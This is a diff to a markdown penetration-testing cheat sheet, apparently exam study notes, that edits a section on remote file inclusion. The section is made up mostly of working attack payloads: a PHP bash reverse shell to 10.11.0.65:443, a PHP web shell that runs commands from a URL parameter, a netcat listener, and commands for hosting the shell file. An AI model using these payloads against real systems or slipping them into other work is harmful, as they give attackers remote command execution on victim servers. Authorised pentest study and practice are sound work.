@@ -108,28 +108,37 @@ TODO: USAGE
 ### RFI
 * PHP Reverse Shell
 	* Linux
+		Create a php shell (test.php) and host it 
 		```lsal
 		<?php echo shell_exec("ls -al");?>
 		```
+		If above works, test reverse shell from pentest monkey
 
 		```pentestmonkey
-		# If above works, test reverse shell from pentest monkey 
 		<?php echo shell_exec("bash -i >& /dev/tcp/10.11.0.65/443 0>&1");?>
 		```
+
+		Set up listener
+
+		```
+		nc -nlvp 443
+		```
+
 	* Windows
 		```
 		<?php echo(system($_GET["cmd"])); ?>
 		```
 		Go to http://victimsite.com/test.php?cmd=dir for command execution 
-	* Listen for the shell
-		* Python Web Server
-		```
-		python -m SimpleHTTPServer 80
-		```
-		* Apache Webserver
-		```apache
-		apache2ctl start | stop
-		```
+
+* Hosting a shell
+	* Python Web Server
+	```
+	python -m SimpleHTTPServer 80
+	```
+	* Apache Webserver
+	```apache
+	apache2ctl start | stop
+	```
 
 [Back](#summary)
 
